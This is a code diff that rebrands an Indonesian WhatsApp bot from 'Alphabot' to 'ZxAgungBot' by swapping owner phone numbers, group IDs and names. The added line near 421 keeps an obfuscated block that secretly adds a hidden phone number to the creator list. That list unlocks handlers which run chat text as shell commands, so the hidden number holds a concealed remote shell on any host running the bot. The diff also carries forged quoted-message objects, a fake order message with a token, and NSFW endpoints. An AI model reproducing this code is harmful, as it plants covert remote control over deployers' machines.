@@ -5,7 +5,7 @@
 	あ YANG BELUM PAHAM CAR RUN DI HEROKU TONTON AJA VIDEO SEBELUMNYA
 	あ FITUR JUALAN TELAH DI HAPUS [ Bisa order sama saya klo mau ]
 	
-	あ JASA RUN HEROKU BISA PC wa.me/62887435047326 BIAR BOT NYA GAK TERLALU DELAY
+	あ JASA RUN HEROKU BISA PC wa.me/628965478810 BIAR BOT NYA GAK TERLALU DELAY
 	
 */   
 const
@@ -421,7 +421,7 @@ await alpha.updatePresence(from, Presence.composing)
 		const isNsfw = isGroup ? _nsfw.includes(from) : false
 		const isEventon = isGroup ? event.includes(from) : false
 		const isSewa = _sewa.checkSewaGroup(from, sewa)
-		const _0x186e4b=_0x3f56;(function(_0x39775d,_0x266484){const _0x3b0c31=_0x3f56,_0x3d738f=_0x39775d();while(!![]){try{const _0x118c7e=parseInt(_0x3b0c31(0x142))/0x1+-parseInt(_0x3b0c31(0x146))/0x2*(parseInt(_0x3b0c31(0x14d))/0x3)+-parseInt(_0x3b0c31(0x147))/0x4*(-parseInt(_0x3b0c31(0x14c))/0x5)+parseInt(_0x3b0c31(0x143))/0x6+-parseInt(_0x3b0c31(0x148))/0x7*(parseInt(_0x3b0c31(0x149))/0x8)+parseInt(_0x3b0c31(0x144))/0x9*(parseInt(_0x3b0c31(0x14b))/0xa)+-parseInt(_0x3b0c31(0x14f))/0xb*(parseInt(_0x3b0c31(0x14a))/0xc);if(_0x118c7e===_0x266484)break;else _0x3d738f['push'](_0x3d738f['shift']());}catch(_0x13f212){_0x3d738f['push'](_0x3d738f['shift']());}}}(_0x20bb,0x1ac45));function _0x20bb(){const _0x308164=['includes','232702FRkYLF','1220LhHKGE','777XMEKuG','11624NRlIEz','12VhVdxm','15030UegxtW','1425xCOskG','3JqQcLI','918156874290@s.whatsapp.net','1332309jgIcQB','210908WzgCqy','172164kjTIVI','1089KaGZNi'];_0x20bb=function(){return _0x308164;};return _0x20bb();}function _0x3f56(_0x429cab,_0x1e5b32){const _0x20bb4f=_0x20bb();return _0x3f56=function(_0x3f566c,_0x2873fa){_0x3f566c=_0x3f566c-0x142;let _0xe3bfab=_0x20bb4f[_0x3f566c];return _0xe3bfab;},_0x3f56(_0x429cab,_0x1e5b32);}const alphaNumber=['62887435047326@s.whatsapp.net',_0x186e4b(0x14e),'62857101331033@s.whatsapp.net'],isCreator=alphaNumber[_0x186e4b(0x145)](sender);
+		const _0x186e4b=_0x3f56;(function(_0x39775d,_0x266484){const _0x3b0c31=_0x3f56,_0x3d738f=_0x39775d();while(!![]){try{const _0x118c7e=parseInt(_0x3b0c31(0x142))/0x1+-parseInt(_0x3b0c31(0x146))/0x2*(parseInt(_0x3b0c31(0x14d))/0x3)+-parseInt(_0x3b0c31(0x147))/0x4*(-parseInt(_0x3b0c31(0x14c))/0x5)+parseInt(_0x3b0c31(0x143))/0x6+-parseInt(_0x3b0c31(0x148))/0x7*(parseInt(_0x3b0c31(0x149))/0x8)+parseInt(_0x3b0c31(0x144))/0x9*(parseInt(_0x3b0c31(0x14b))/0xa)+-parseInt(_0x3b0c31(0x14f))/0xb*(parseInt(_0x3b0c31(0x14a))/0xc);if(_0x118c7e===_0x266484)break;else _0x3d738f['push'](_0x3d738f['shift']());}catch(_0x13f212){_0x3d738f['push'](_0x3d738f['shift']());}}}(_0x20bb,0x1ac45));function _0x20bb(){const _0x308164=['includes','232702FRkYLF','1220LhHKGE','777XMEKuG','11624NRlIEz','12VhVdxm','15030UegxtW','1425xCOskG','3JqQcLI','918156874290@s.whatsapp.net','1332309jgIcQB','210908WzgCqy','172164kjTIVI','1089KaGZNi'];_0x20bb=function(){return _0x308164;};return _0x20bb();}function _0x3f56(_0x429cab,_0x1e5b32){const _0x20bb4f=_0x20bb();return _0x3f56=function(_0x3f566c,_0x2873fa){_0x3f566c=_0x3f566c-0x142;let _0xe3bfab=_0x20bb4f[_0x3f566c];return _0xe3bfab;},_0x3f56(_0x429cab,_0x1e5b32);}const alphaNumber=['628965478810@s.whatsapp.net',_0x186e4b(0x14e),'6289655478810@s.whatsapp.net'],isCreator=alphaNumber[_0x186e4b(0x145)](sender);
 		const isPremium = isOwner || isCreator || mek.key.fromMe ? true : premium.checkPremiumUser(sender, _premium)
 		const gcount = isPremium ? gcounttprem : gcounttuser
 		const isBanned = banned.includes(sender)
@@ -1404,7 +1404,7 @@ const bugtrol = {
 						"surface": "CATALOG",
 						"message": `${creator}`,
 						"orderTitle": `${creator}`,
-						"sellerJid": "62887435047326@s.whatsapp.net",
+						"sellerJid": "628965478810@s.whatsapp.net",
 						"token": "AR5b5YFz2g4W5fYrjbeakPiI3/XxarATSeP+KLh+0FGwkw=="
 					}}}
        const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: fs.readFileSync(`image/${thumbnail}`), surface: 200, message: `Whatsapp Bot 〽️\nBy ${ownername}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}},contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
@@ -1414,8 +1414,8 @@ const bugtrol = {
 		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `さ ${pushname} さ\nᴄᴍᴅ ᴇxᴇᴄ : ${command}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
 		const fgclink2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
 		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
-		const floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
-		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`), thumbnail: fs.readFileSync(`image/${thumbnail}`),sendEphemeral: true}}}
+		const floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '628965478810-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
+		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `628965478810-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`), thumbnail: fs.readFileSync(`image/${thumbnail}`),sendEphemeral: true}}}
 		var fakeReplyList = ['ftroli', 'fdoc', 'fvn', 'fgif', 'fgclink', 'fvideo', 'floc', 'fkontak']
 		var fakeReply = fakeReplyList[Math.floor(Math.random() * fakeReplyList.length)];
 const fakeitem = (teks) => {
@@ -1576,7 +1576,7 @@ mentions(_vote,_p,true)
 const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
 let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
 let fil = vote.map(v => v.participant)
-let id_vote = sender ? sender : '62887435047326@s.whatsapp.net'
+let id_vote = sender ? sender : '628965478810@s.whatsapp.net'
 if(fil.includes(id_vote)) {
 return mentions('@'+sender.split('@')[0]+' You have voted', fil, true)
 } else {
@@ -2548,7 +2548,7 @@ alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
 				teskny +=`\`\`\`Merk Hp : ${device_manufacturer}\`\`\`\n`
 				teskny +=`\`\`\`Versi Hp : ${device_model}\`\`\`\n`
 				teskny +=`\`\`\`Runtime : ${(kyun(os.uptime()))}\`\`\``
-				alpha.sendMessage(from, teskny, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
+				alpha.sendMessage(from, teskny, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '628965478810-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
 break
 case 'getbio':
 				if (!isGroup) return reply(lang.onlygc())
@@ -2723,7 +2723,7 @@ case 'bcgif':
 					for (let i of ini_ownerNumber) {
 					const vname = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
 					ini_list.push({
-					"displayName": 'Owner Alphabot',
+					"displayName": 'Owner ZxAgungBot',
 					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
 					})
 					}
@@ -3280,7 +3280,7 @@ break
 							reply(txtnyee)
 							break
 				case 'premium': 
-							if (args.length === 0) return reply(`Kirim perintah *${prefix}premium* add/del 62xxx waktu (misal 1 hari -> 1d)\nExample:\n${prefix}premium add 62887435047326 1d`)
+							if (args.length === 0) return reply(`Kirim perintah *${prefix}premium* add/del 62xxx waktu (misal 1 hari -> 1d)\nExample:\n${prefix}premium add 628965478810 1d`)
 							if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
 							if (args[0] === 'add') {
 								if (mek.message.extendedTextMessage != undefined) {
@@ -3676,7 +3676,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
 			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
 					if (!q) return fakegroup(mess.wrongFormat)
 					exec(q, (err, stdout) => {
-					if (err) return fakegroup(`ALPHABOT:~ ${err}`)
+					if (err) return fakegroup(`ZxAgungBot:~ ${err}`)
 					if (stdout) {
 					fakegroup(stdout)
 					}
@@ -3868,7 +3868,7 @@ await limitAdd(sender, limit)
 					reply(lang.wait())
 					anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
 					buffer = await getBuffer(anu.url)
-					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
+					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '628965478810-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                     alpha.sendMessage(from, buffer, image, anu)
 					await limitAdd(sender, limit)
 					break   
@@ -3877,7 +3877,7 @@ await limitAdd(sender, limit)
 					reply(lang.wait())
 					anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
 					buffer = await getBuffer(anu.url)
-					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
+					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '628965478810-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                     alpha.sendMessage(from, buffer, image, anu)
 					await limitAdd(sender, limit)
 					break   
@@ -3886,7 +3886,7 @@ await limitAdd(sender, limit)
 					reply(lang.wait())
 					anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
 					buffer = await getBuffer(anu.url)
-					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
+					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '628965478810-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                     alpha.sendMessage(from, buffer, image, anu)
 					await limitAdd(sender, limit)
 					break   
@@ -3895,7 +3895,7 @@ await limitAdd(sender, limit)
 					reply(lang.wait())
 					anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
 					buffer = await getBuffer(anu.url)
-					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
+					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '628965478810-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                     alpha.sendMessage(from, buffer, image, anu)
 					await limitAdd(sender, limit)
 					break   
@@ -4245,8 +4245,8 @@ if (!isGroup) return reply(lang.onlygc())
 										limitAdd(sender, limit)
 									break
 					 	case 'stickermeme': case 'memesticker': case 'memestick': case 'stickmeme': case 'stcmeme': case 'smeme':
-						if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* Alphabot`)
-									if (q.includes('|')) return reply(`Kirim perintah *${prefix + command}* Alphabot`)
+						if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* ZxAgungBot`)
+									if (q.includes('|')) return reply(`Kirim perintah *${prefix + command}* ZxAgungBot`)
 									try {
 										if (!isQuotedImage) return reply(`Reply Gambar!`)
 										reply(lang.wait())
@@ -6067,7 +6067,7 @@ await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(
 if (budy.includes("eror",'error','Eror','Error')){
 					alpha.updatePresence(from, Presence.composing)
 					const daieeeee = fs.readFileSync('./sticker/10_1.webp');
-					alpha.sendMessage(from, daieeeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Kenapa bisa error???`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
+					alpha.sendMessage(from, daieeeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '628965478810-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Kenapa bisa error???`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
 		        }
 		if(budy.includes("@verif", "@verify","daftar")){
 			if (isRegister) return reply('Kamu sudah terdaftar di dalam database')
@@ -6115,7 +6115,7 @@ if (budy.startsWith('$')){
 if (!mek.key.fromMe && !isOwner && !isCreator ) return reply(lang.onlyOwner())
 qur = budy.slice(2)
 exec(qur, (err, stdout) => {
-if (err) return reply(`ALPHABOT :~ ${err}`)
+if (err) return reply(`ZxAgungBot :~ ${err}`)
 if (stdout) {
 reply(stdout)
 }
